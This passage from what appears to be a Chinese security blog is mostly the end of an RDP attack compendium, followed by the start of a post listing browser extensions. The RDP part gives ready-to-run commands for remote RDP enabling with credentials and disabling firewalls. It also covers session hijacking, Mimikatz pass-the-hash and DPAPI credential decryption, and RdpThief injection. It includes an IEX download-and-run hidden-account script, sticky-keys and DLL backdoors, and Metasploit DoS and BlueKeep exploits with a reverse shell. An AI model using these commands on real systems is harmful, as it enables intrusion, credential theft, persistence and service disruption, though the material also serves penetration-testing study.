/t REG_DWORD /d 3000 /f (3) WMIC命令开启3389端口 支持系统： Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（1：ON、0：OFF） wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 前提条件是确保“Windows Management Instrumentation（Winmgmt）”服务已正常启动。 (4) WMIC开启远程主机3389端口 支持系统： Win2k/XP/Win2k3 // wmic /node:&quot;[full machine name]&quot; /USER:&quot;[domain]\\[username]&quot; PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 wmic /node:192.168.0.103 /user:administrator /password:betasec PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 支持系统： Win7/Win2k8/Win8.1/Win10/2012/2016 wmic /node:192.168.0.116 /user:administrator /password:betasec RDTOGGLE WHERE ServerName='WIN-TO2CN3V2VPR' call SetAllowTSConnections 1 wmic /node:192.168.0.116 /user:administrator /password:betasec process call create 'cmd.exe /c REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f' 注意事项： 其实就是利用WMIC远程执行命令的方式来执行WMIC、REG等开启3389端口的命令。 WMIC远程开启3389端口时不能用%COMPUTERNAME%环境变量替代远程主机的计算机名。 错误：描述 = 拒绝访问，这是因为开启了UAC用户账户控制，只允许RID500管理员执行此操作。 (5) Windows API开启3389端口 冷逸老哥用C++写的“开3389工具”有点小问题，在两台Windows2008机器上测试时分别报出缺少vcruntime140.dll、api-ms-win-crt-runtime-l1-1-0.dll，可以自己去调试编译下。 根据@冷逸老哥的思路用C#也写了一个，目标框架：.NET Framework 2.0，可用CobaltStrike execute-assembly加载到内存中实现无落地执行， 其工具原理就是利用RegCreateKeyEx和RegSetValueEx两个API和Microsoft.Win32 RegistryKey类操作系统注册表，与无Net.exe添加管理员用户一样，都是直接利用Windows API执行相应操作！！！ https://github.com/3had0w/Open3389 应用场景-1： 目标主机因存在某安全防护软件而无法用reg、wmic命令开启3389端口时，可以尝试使用这款工具来查询和开启3389端口，可用execute-assembly加载到内存中执行。 应用场景-2： 目标主机因存在某安全防护软件（如：某锁、某安全卫士）在拦截rundll32.exe时则不能用execute-assembly加载到内存中执行，所以只能选择落地执行，目前为止还是免杀的。 (6) MSSQL xp_regwrite开启3389端口 应用场景：xp_cmdshell被禁用/删除且无法恢复时，可尝试用xp_regread、xp_regwrite来查询和开启目标机器3389端口，也可以选择用sp_OACreate、Agent Job等其他命令执行方式。 # 1、查询3389开启状态 exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server' ,'fDenyTSConnections' # 2、查询3389远程桌面端口 exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp','PortNumber' # 3、开启3389远程桌面端口（0：ON、1：OFF） exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG_DWORD',0; 四、防火墙配置 // 配置一下防火墙，设置为允许远程桌面连接，命令： netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow // netsh 是 windows 的网络配置命令，advfirewall firewall 意思为防火墙的高级设置，add rule 是添加一条规则 // name 指定规则名称，protocol 指定协议，dir 指定是出站还是入站，localport 指定端口，action 指定动作 allow 允许 // 关闭防火墙 netsh firewall set opmode mode=disable 五、RDP连接工具 开启目标主机的远程桌面后，我们便可以对目标主机进行连接了： Linux 系统上的可以使用 rdesktop： redesktop 192.168.93.30 # redesktop IP Windows 系统上可以使用 mstsc.exe 六、暴力破解RDP口令 在实战中，攻击者可以借助 Nmap 来扫描目标主机 3389 端口是否开启，如果目标主机开启了 3389 端口，那我们便可以对目标主机的远程桌面登录口令进行暴力猜解。 可以使用超级弱口令检查工具和Hydra之类的工具 下载地址：shack2/SNETCracker 七、RDP劫持 在 Windows 中有一个 tscon 命令行下使用的工具 首先执行如下命令获取用户对应的会话 ID： query user 可以看到用户对应的会话 ID，然后通过执行 tscon 命令即可成功切换至目标用户的远程桌面 tscon 会话id /PASSWORD:要切换的用户密码 eg: tscon 2 /PASSWORD:Bunny2021 在 SYSTEM 权限下直接执行 tscon 会话切换命令， 不需要输入密码： tscon ID 高权限用户劫持低权限用户的 RDP 高权限用户劫持低权限用户的 RDP 会话利用起来比较简单，由于具有管理员权限，可以直接通过创建服务等方式获取 SYSTEM 权限。 创建劫持用户会话的服务： sc create rdp binpath= &quot;cmd.exe /k tscon 会话id /dest:会话名称&quot; sc create rdp binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#4&quot; #修改为目标会话id和当前会话名 sc start rdp 执行sc start rdp后，我们创建的劫持会话的服务将会启动， 由于 Windows 是以 SYSTEM 权限运行服务的，所以我们tscon 2命令也会以 SYSTEM 权限运行， 此时便可以在不提供目标用户密码的情况下成功劫持目标用户的会话 低权限用户劫持高权限用户的 RDP 低权限用户想要劫持高权限用户的 RDP 的话需要想办法提权，即将自己的权限提升至 SYSTEM。 八、哈希传递登录 RDP Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ” 受限管理员” （Restricted Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。 在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 “Restricted Admin Mode” 也行，那么我们便可以使用 Hash 来直接实现 RDP 远程登录。Restricted Admin Mode 在 Windows 8.1 和 Windows Server 2012 R2 上默认开启。 我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭： REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f # 查看是否成功开启 REG query &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot; 然后再攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行mstsc.exe /restrictedadmin来打开： privilege::debugsekurlsa::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec &quot;/run:mstsc.exe /restrictedadmin&quot; 注意，这里的受限管理员模式顾名思义只对管理员组有效。所以如果你获取到的用户属于远程桌面用户组，那么是无法通过 Hash 登录的。 九、多用户登录 多用户登陆同一个账户 Windows server 2012 打开cmd，输入gpedit.msc 组策略，找到【计算机设置】–【管理模板】–【windows组件】–【远程桌面服务】–【远程桌面会话主机】–【连接】 按照以下步骤操作： 1、拒绝将已经登录到控制台会话的管理员注销—选择启用 2、限制连接的数量—选择启用，配置‘允许的RD最大连接数’为10个 3、将远程桌面服务用户限制到单独的远程桌面服务会话—选择禁用 打开管理员命令提示符运行 gpupdate /force Windows server 2008 依次打开”管理工具”(控制面板或者&quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools&quot;)——”远程桌面服务”——”远程桌面会话主机配置”——双击”限制每个用户只能进行一个会话”——在弹出的对话框中把”限制每个用户只能进行一个会话”勾去掉——确定。 开始-运行-输入regedit打开注册表 ， 在右边找到 fSingleSessionPerUser 把值由1改为0 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server 命令操作 reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; 多用户登录不同账户 详情见：渗透技巧——Windows系统远程桌面的多用户登录 非服务器版本的 Windows 系统默认只允许一个账户登录，远程登录时， 使用与原系统相同的账户，原系统将被切换到登录界面 使用不同的账户，登录时提示其他用户已登录到此计算机， 选择继续后，原系统桌面将弹框提示是否断开当前连接 (30 秒后默认选择同意，退回到登录界面) Mimikatz Mimikatz 开启多用户登录，支持Win 7 及以前的版本系统 mimikatz.exe privilege::debug ts::multirdp PS：使用与原系统相同的账户，原系统还是会被切换到登录界面；不同账户登陆成功 RDPwrap 工程地址： https://github.com/stascorp/rdpwrap 工具地址： https://github.com/stascorp/rdpwrap/releases RDPwrap：支持Win Vista - Win10 RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载 SharpDoor 仅使用于Win 10 开启多会话RDP 十、RDP中间人攻击 中间人攻击通常会导致凭据捕获。同样的，在对 RDP 会话进行中间人攻击，攻击者可以获得一个登录用户的明文密码，用于后期的横向移动。当 RDP 爆破走不通时，我们不妨尝试一下中间人。 Seth 是一个用 Python 和 Bash 编写的 RDP 中间人攻击自动化工具，通过尝试降级连接用以提取明文凭证来实现 MitM RDP 连接，而不管网络级别的身份验证（NLA）是否启用。 项目地址：https://github.com/SySS-Research/Seth 使用该工具所要求的环境： Python 3 Tcpdump Arpspoof Openssl 使用方法如下： ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER_IP&gt; &lt;VICTIM_IP&gt; &lt;GATEWAY_IP|HOST_IP&gt; [&lt;COMMAND&gt;] INTERFACE：网卡 ATTACKER IP：中间人 IP VICTIM IP：连接者 IP GATEWAY IP|HOST IP：被连接的远程主机 IP COMMAND：启动时执行的命令 执行以下命令启动 seth 监听： ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30 然后当 PC 上的用户远程登录 DC 时便会抓取到登录用户的明文密码。不仅如此，还可以对用户键盘的操作进行记录，甚至使用&lt;COMMAND&gt;在目标主机上执行命令。 详情请看：https://www.freebuf.com/sectool/178146.html 攻击成功后类似如下： # ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30 ███████╗███████╗████████╗██╗ ██╗ ██╔════╝██╔════╝╚══██╔══╝██║ ██║ by Adrian Vollmer ███████╗█████╗ ██║ ███████║ seth@vollmer.syss.de ╚════██║██╔══╝ ██║ ██╔══██║ SySS GmbH, 2017 ███████║███████╗ ██║ ██║ ██║ https://www.syss.de ╚══════╝╚══════╝ ╚═╝ ╚═╝ ╚═╝ [*] SpoofinG arp replies... [*] TurninG on IP forwardinG... [*] Set iptables rules for SYN packets... [*] WaitinG for a SYN packet to the oriGinal destination... [+] Got it! OriGinal destination is 192.168.93.30 [*] Clone the x509 certificate of the oriGinal destination... [*] Adjust the iptables rule for all packets... [*] Run RDP proxy... ListeninG for new connection Connection received from 192.168.93.20:50431 DownGradinG authentication options from 11 to 3 Enable SSL alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000 Tamper with NTLM response TLS alert access denied, DownGradinG CredSSP Connection lost Connection received from 192.168.57.103:50409 ListeninG for new connection Enable SSL Connection lost Connection received from 192.168.57.103:50410 ListeninG for new connection Enable SSL HidinG forGed protocol request from client .\\alice:ilovebob Keyboard Layout: 0x409 (EnGlish_United_States) Key press: LShift Key press: S Key release: S Key release: LShift Key press: E Key release: E Key press: C Key release: C Key press: R Key release: R Key press: E Key release: E Key press: T Key release: T Connection lost [*] CleaninG up... [*] Done. 十一、获取RDP远程桌面连接记录 在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。接下来我们就介绍一下如何导出 RDP 连接的历史记录。 获取 RDP 远程桌面连接记录可以通过枚举注册表完成，但是如果想要获得所有用户的历史记录，需要逐个获得用户的 NTUSER.DAT 文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。 详情见：渗透技巧——获得Windows系统的远程桌面连接历史记录 导出当前用户的历史记录 可以通过枚举下面的注册表键值查看当前用户的历史记录： HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers 也可以通过 PowerShell 命令行来实现，首先通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名： dir &quot;Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; -Name 然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名： (Get-ItemProperty -Path &quot;Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\192.168.93.30&quot;).UsernameHint 下面给出一个三好学生写的枚举脚本： $RegPath = &quot;Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\&quot; $QueryPath = dir $RegPath -Name foreach($Name in $QueryPath) { Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint Write-Host &quot;Server:&quot;$Name Write-Host &quot;User:&quot;$User&quot;`n&quot; } Catch { Write-Host &quot;No RDP Connections History&quot; } } 导出已登录用户的历史记录 已登录用户的注册表信息会同步保存在HKEY_USERS\\&lt;SID&gt;目录下，&lt;SID&gt;要对应每个用户的 SID： 几个用户，分别有几个子项。我们可以通过枚举注册表键值 HKEY_USERS\\SID\\Software\\Microsoft\\Terminal Server Client\\Servers 就能够获得已登录用户的远程桌面连接历史记录： 如果第三个用户未登录，此时是无法直接获得该用户的注册表信息的，会报错，也就无法直接导出该用户的远程桌面连接历史记录。 最后给出一个三好学生写的枚举脚本： $AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser){$RegPath = &quot;Registry::HKEY_USERS\\&quot;+$User.SID+&quot;\\Software\\Microsoft\\Terminal Server Client\\Servers\\&quot;Write-Host &quot;User:&quot;$User.NameWrite-Host &quot;SID:&quot;$User.SIDWrite-Host &quot;Status:&quot;$User.StatusTry { $QueryPath = dir $RegPath -Name -ErrorAction Stop}Catch{Write-Host &quot;No RDP Connections History&quot;Write-Host &quot;----------------------------------&quot;continue}foreach($Name in $QueryPath){ Try { $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHintWrite-Host &quot;Server:&quot;$NameWrite-Host &quot;User:&quot;$User}Catch {Write-Host &quot;No RDP Connections History&quot;}}Write-Host &quot;----------------------------------&quot; } 导出所有用户的历史记录 前面刚说了，对于未登录用户，无法直接获得注册表配置信息，那有什么解决办法？其实这里可以通过加载配置单元的方式来解决，即打开用户的 NTUSER.DAT 文件，加载配置单元导入用户配置信息，然后进行枚举。 选中 HKEY_USERS 项，点击“文件” —&gt; “加载配置单元”，如下图： 选择打开用户的 NTUSER.DAT 文件， 路径为C:\\Documents and Settings\\用户名\\NTUSER.DAT 接着指定一个项名称，即可在 HKEY_USERS 下读取该用户的注册表配置信息 此外，也可以通过命令行实现加载配置单元的实例： Reg load HKEY_USERS\\testmoretz C:\\Documents and Settings\\moretz\\NTUSER.DAT 最后给出一个三好学生写的枚举脚本： https://github.com/3gstudent/List-RDP-Connections-History 十二、获取连接过的RDP密码 在获取内网机器管理员权限后，查看是否有保存到本地的RDP连接密码，对保存到本地的RDP连接密码进行解密，解密成功后可使用此凭据继续横向移动。 保存了RDP 凭证 Windows保存RDP凭据的目录是： C:\\Users\\用户名\\AppData\\Local\\Microsoft\\Credentials 查看保存在本地的远程主机信息 cmdkey /list 注意:cmdkey /list命令务必在Session会话下执行，system下执行无结果。 或者使用powerpick查看 powerpick Get-ChildItem C:\\Users\\rasta_mouse\\AppData\\Local\\Microsoft\\Credentials\\ -Force 查看本地用户此目录下是否存有RDP密码文件,这条命令只能在cmd中执行!!! powershell无法使用 dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 查看连接记录 查看本地机器本地连接过的目标机器。 reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /s 也可以使用三好学生的ps脚本 https://github.com/3gstudent/List-RDP-Connections-History 利用步骤 一、mimikatz // 选择一个密码文件对其进行解密，获取guidMasterKey和pbData的值， // pbData是我们要解密的数据，guidMasterKey是解密所需要的密钥。 // 待会要通过guidMasterKey找对应的Masterkey。 // SESSIONID 即为 %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\ 目录下的一个文件夹名 mimikatz # dpapi::cred /in:C:\\Users\\USERNAME\\AppData\\Local\\Microsoft\\Credentials\\SESSIONID eg: mimikatz # privilege::debug mimikatz # dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\8781378F7D47006A4FC98D2F8A266F58 // 如果你没有获得到解码凭证则需要手动携带Masterkey // 根据guidMasterKey找到对应的Masterkey,这里LSASS已经在其缓存中存有这个key因此我们可以使用SeDebugPrivilege获取。 mimikatz # sekurlsa::dpapi // 通过Masterkey解密出明文RDP连接密码。 mimikatz &quot;dpapi::cred /in:C:\\Users\\USERNAME\\Desktop\\test\\SESSION /masterkey:GUID key对应的masterkey&quot; eg: mimikatz &quot;dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\8781378F7D47006A4FC98D2F8A266F58 /masterkey:1df6b7a86b7aa3238c6899b1b4fd7b4ccba852db9b2ea611bbb7943f34b788f55d27835591ccde1e6c643d9aca724fd495282f5fc92ee80746262d8759b9d23d&quot; 二、netpass nirsoft密码恢复工具介绍：nirsoft 全套工具下载 https://www.nirsoft.net/protected_downloads/passreccommandline.zip 用户名：download 密码：nirsoft123! 解压密码：nirsoft123! netpass下载 x86 https://www.nirsoft.net/toolsdownload/netpass.zip x64 https://www.nirsoft.net/toolsdownload/netpass-x64.zip 使用： 双击netpass.exe 三、其他 powershell脚本自动化解密… 未保存RDP凭证 SharpRDPThief 是 RDPThief 的 C# 实现。它使用 EasyHook 将一个 DLL 注入 mstsc.exe，然后它会挂钩 CryptProtectMemory api 调用。hook 将从传递给 CryptProtectMemory 的地址中获取密码，然后通过 EasyHook 的 IPC 服务器将其发送到主进程。 https://github.com/0x09AL/RdpThief https://github.com/passthehashbrowns/SharpRDPThief 目前这只是概念实现的证明，需要 RDPHook.dll 与 SharpRDPThief.exe 位于同一目录中。 RdpThief 本身是一个独立的 DLL，当它被注入到 mstsc.exe 进程中时，将执行 API 挂钩，提取明文凭据并将它们保存到文件中。 当在 Cobalt Strike 上加载 aggressor 脚本时，有三个命令可用： rdpthief_enable – 启用新 mstsc.exe 进程的心跳检查并注入它们。 rdpthief_disable – 禁用新 mstsc.exe 的心跳检查，但不会卸载已加载的 DLL。 rdpthief_dump – 打印提取的凭据（如果有就会打印出来） 参考文章： https://mp.weixin.qq.com/s/uHnDlHbOVGnqzZdj8UnXIg https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/ 十三、与远程桌面相关的权限维持方法 Windows 系统隐藏账户 利用工具： 3gstudent/Windows-User-Clone: Create a hidden account # 添加用户并隐藏 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1') https://github.com/An0nySec/ShadowUser 详情参考： 渗透技巧——Windows系统的帐户隐藏 Windows 粘滞键与辅助功能后门 参考文章：https://www.cnblogs.com/BOHB-yunying/p/11695140.html 利用工具 Metasploit 中的post/windows/manage/sticky_keys模块可实现自动化地利用沾滞键的权限维持技术。 该模块将用 cmd.exe 替换那些辅助功能的二进制文件（sethc、osk、disp、utilman）： 使用方法如下： use post/windows/manage/sticky_keys set session 6 set target UTILMAN exploit 此时，我们开启目标主机的远程桌面，当我们点击左下角的辅助功能按钮后，成功弹出了 CMD 窗口，并且为 SYSTEM 权限的： 不仅是 CMD，我们还可以换成任意的 Payload 用于钓鱼，当受害者使用响应功能时便会触发 Payload 实施攻击。 简介 如果你在电脑上连按五次 shift 键，你就会发现电脑屏幕上弹出了一个叫做 “粘滞键” 的程序， 在不知道用户账户密码，没有登录进系统之前，连按五次 shift 键也可以弹出这个程序，也称之为shift后门 但是首先得需要进入远程桌面登录界面，需要关闭鉴权和securitylayer验证，参考本文开篇。 粘滞键程序名称为 “sethc.exe”，其路径为 “c:\\windows\\system32\\sethc.exe”。 **类似程序 ** 放大镜 Magnify.exe win 和 + 同时按 讲述人 Narrator.exe win 和 enter 同时按 制作过程 利用粘滞键做后门是一种比较常见的持续控制方法。其基本流程如下： 首先，我们手动或利用工具，找到 sethc.exe 将其删除或改名为 sethc.exe.bak(非必要) 接着将 cmd.exe 程序复制一个副本，并命名为 “sethc.exe”，替换原来的sethc.exe 最后，重启计算机再次按下 5 次 Shift 键时，就会弹出 CMD 界面，后门制作成功。 制作的方法如下，在目标主机上执行如下命令即可： // 将sethc.exe重命名备份 move C:\\WINDOWS\\system32\\sethc.exe C:\\WINDOWS\\system32\\sethc.exe.bak // 将一个cmd.exe副本保存伪装成sethc.exe copy C:\\WINDOWS\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe 此时，我们打开目标主机的远程桌面，连续按下五次 shift 键，便可以看到目标主机屏幕上成功弹出了一个 CMD 窗口 一般情况下，即使是 SYSTEM 权限也是无法修改 sethc.exe 的，只有 TrustedInstaller 权限才可以。 解决办法一： 修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制 解决办法二： 出现这样的情况我们就需要将将权限目录下的所有文件及文件夹、子文件夹下的所有者更改为管理员组(administrators)命令 takeown /f c:\\windows\\system32\\*.* /a /r /d y // 目录下的文件、子文件夹的NTFS权限修改为仅管理员组(administrators)完全控制 cacls c:\\windows\\system32\\*.* /T /E /G administrators:F // 如果提权后是system权限，需要在转化 cacls c:\\windows\\system32\\*.* /T /E /G system:F 解决办法三： 模拟一个 TrustedInstaller 权限的令牌获取 TrustedInstaller 权限，然后再执行上述操作。我们的思路如下： 当我们启动 TrustedInstaller 服务时， 会启动进程 TrustedInstaller.exe， 该程序的权限为 NT SERVICE\\TrustedInstaller，那么我们就可以窃取该进程的令牌。 首先进入 shell 启动 TrustedInstaller 服务： sc.exe start TrustedInstaller # 先进入shell启动TrustedInstaller服务 然后执行如下即可： use incognitops # 找到TrustedInstaller的进程PID，这里为3476 steal_token &lt;PID&gt; # 从该进程中窃取令牌getuid 此时便可以对 sethc.exe 进行任何操作了。 Lpk后门 一般系统都存在lpk.dll文件，该文件位于C:\\WINDOWS\\system32和C:WINDOWS\\system\\dllcache目录下。当exe文件运行时，lpk.dll就会被Windows动态链接，系统会先从当前目录查找，然后在到系统目录查找并加载。下面使用工具生成木马并保存为lpk.dll。我们要做的就是替换系统的lpk.dll文件。 将这个文件替换系统自带的文件，并按5次shift键，系统就会运行sethc.exe程序，进而lpk.dll就会被Windows动态链接， 同时按下我们设置的键(我设置的是65和83，即一起按下AS键)，输入我们设置的密码， 最终弹出我们的shell窗口，添加账号后即可登录。 十四、与远程桌面相关的漏洞 DOS 攻击 这一利用借助的是 2012 年爆出来的 MS12-020 远程桌面协议 RDP 远程代码执行漏洞（CVE-2012-0002）。 该漏洞是由于 Windows 在处理某些对象时存在错误，可通过特制的 RDP 报文访问未初始化或已经删除的对象，导致任意代码执行 在 Metasploit 中有两个该漏洞的利用模块： 首先为了确定目标主机是否容易受到该漏洞的影响，可以先使用第二个命令来进行检测： use auxiliary/scanner/rdp/ms12_020_check set rhosts 192.168.93.20 set rport 3389 exploit 目标机存在漏洞，然后尝试使用第一个模块进行攻击，这将对目标系统发起 DOS 攻击，最终导致目标系统蓝屏： use auxiliary/dos/windows/rdp/ms12_020_maxchannelid sset rhosts 192.168.93.20 set rport 3389 exploit 从上图中可以看到目标系统是由于某些问题导致系统正在关闭。DoS 攻击执行者通常攻击托管在诸如银行或信用卡支付网关等高端 Web 服务器上的站点或服务，通过暂时或无限期地中断连接 Internet 的主机服务，使其目标用户无法使用机器或网络资源。 CVE-2019-0708 2019 年 5 月 14 日微软官方发布安全补丁，修复了 Windows 远程桌面服务的远程代码执行漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口 3389，RDP 协议进行攻击的。 此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与 2017 年 WannaCry 恶意软件的传播方式类似。 它影响了某些旧版本的 Windows 系统，包括： Windows 7 Windows server 2008 R2 Windows server 2008 Windows 2003 Windows xp 在 Metasploit 中已经有了该漏洞的利用模块： 第一个模块用来检测目标机是否存在漏洞，第二个模块用来进行攻击。设置好参数直接利用即可： use exploit/windows/rdp/cve_2019_0708_bluekeep_rce set payload windows/x64/meterpreter/reverse_tcp set rhosts 192.168.93.20 set lhost 192.168.93.128 set rdp_client_ip 192.168.93.20un set RDP_CLIENT_NAM set target 2 # 这里的 2 代表目标机为虚拟机环境exploit 参考文章 内网渗透测试：初探远程桌面的安全问题 出现身份验证错误，要求的函数不受支持 后渗透之权限维持 -- 隐藏用户的创建和使用 - 先知社区 渗透技巧——从远程桌面客户端提取明文凭据 ","link":"https://bewhale.github.io/post/RDP安全总结/"},{"title":"浏览器插件分享","content":"分享几款日常使用较多的浏览器插件和一些常用于渗透测试的浏览器插件 更多好玩的插件请查看：Chrome插件英雄榜 日常使用 Ctool 程序开发常用工具 程序日常开发常用小工具集合,提供文本处理/哈希/加解密/编码转换/时间戳/二维码/拼音/IP查询/代码优化/Unicode/正则等多种工具 下载地址： Ctool 程序开发常用工具 Surfingkeys 下载地址： https://microsoftedge.microsoft.com/addons/detail/surfingkeys/kgnghhfkloifoabeaobjkgagcecbnppg 扩展管理器（Extension Manager） 下载地址： https://chrome.google.com/webstore/detail/extension-manager/gjldcdngmdknpinoemndlidpcabkggco OneTab Extension 下载地址： https://microsoftedge.microsoft.com/addons/detail/onetab-extension/kgimkccmplbmlalhblhncbecfgijcigm 清除历史记录和Web缓存 下载地址： https://microsoftedge.microsoft.com/addons/detail/clear-history-web-cache/ojilnhojiihncgjnnpphppnmflflhbcg AdBlock插件 这是一款参考各种广告过滤插件开发的功能全面的免费开源广告过滤工具，可以过滤掉网页上的大部分广告：浮动广告，购物广告，恶意弹窗，跟踪代码，这款插件适用于过滤国内网站的广告，国外网站的广告建议使用AdBlock插件。 简悦 - SimpRead 让你瞬间进入沉浸式阅读的 Edge 扩展，类似 Safari 的阅读模式。 下载地址 简悦 - SimpRead - Microsoft Edge Addons 沙拉查词-聚合词典划词翻译 Saladict 沙拉查词是一款专业划词翻译扩展，为交叉阅读而生。大量权威词典涵盖中英日韩法德西语，支持复杂的划词操作、网页翻译、生词本与 PDF 浏览。 下载地址 https://microsoftedge.microsoft.com/addons/detail/%E6%B2%99%E6%8B%89%E6%9F%A5%E8%AF%8D%E8%81%9A%E5%90%88%E8%AF%8D%E5%85%B8%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/idghocbbahafpfhjnfhpbfbmpegphmmp Tampermonkey 懂的都懂 脚本推荐： Userscript+ : 显示当前网站所有可用的UserJS脚本 Jaeger Search By Image | 以图搜图 谷歌上网助手 这是一款专门为科研、外贸、跨境电商、海淘人员、开发人员服务的上网加速工具，Chrome内核浏览器专用，可以解决Chrome扩展无法自动更新问题，一键安装，无需其他配置即可访问以下服务，但是会与“Proxy SwitchyOmega”这类代理插件冲突。 Google搜索：https://www.google.com Gmail邮箱：https://mail.google.com Chrome商店访问以及Google+等服务等。 类似的网站 - 发现相关网站 立即发现与您当前正在浏览的网站类似的网站。 下载地址： 类似的网站 - 发现相关网站 - Chrome 网上应用店 (google.com) 百度文库免费下载 这是一款百度文档免下载券下载文档的插件，可以导出PDF文字和图片，能屏蔽文档中的广告，支持Word、PPT、PDF文档，只要能试读的页面都能下载到，能分页下载完整的文档，非常稳定可靠 下载地址： 百度文库免费下载 - Chrome 网上应用店 (google.com) Desktop Messenger for Telegram 这是一款非官方开发和维护的Telegram Web客户端插件，可直接通过点击插件图标来进行登录和收发信息，有好友发送信息时也会有消息通知。 下载地址： Desktop Messenger for Telegram™ - Chrome 网上应用店 (google.com) 信息收集 FindSomething 该工具用于快速在网页的html源码或js代码中提取一些有趣的信息，包括可能请求的资源、接口的url，可能请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。 下载地址： FindSomething Shodan 这个插件可以自动探测当前网站所属的国家、城市，解析 IP 地址以及开放的服务和端口，包括但不限于 FTP、DNS、SSH 或者其他服务等，属被动信息搜集中的一种。 下载地址： Shodan - Chrome 网上应用店 Wappalyzer 这个插件可用于指纹识别，能够检测出当前网站使用的 Web 框架和 CMS、CDN、统计、中间件、编程语言以及 JavaScript 框架和库等等相关信息。 下载地址： Wappalyzer - Chrome 网上应用店 FOFA Pro View 这个插件比 Shodan 搜集到的信息更全，能够检测出当前网站的托管位置（国家 / 地区 / 城市）、组织、ASN、端口、协议和相关资产等信息。 项目地址：https : //github.com/fofapro/fofa_view 下载地址： FOFA Pro View - Chrome 网上应用店 IP, DNS &amp; Security Tools 这个插件是直接调用 https://hackertarget.com 官网接口来进行查询的，如果长时间不出查询结果时可能就得上 “墙” 了，可查询的信息包括有：IP、路由、DNS、Whios、指纹、HTTP 头、同服等。 IP Address and Domain Information 下载地址： 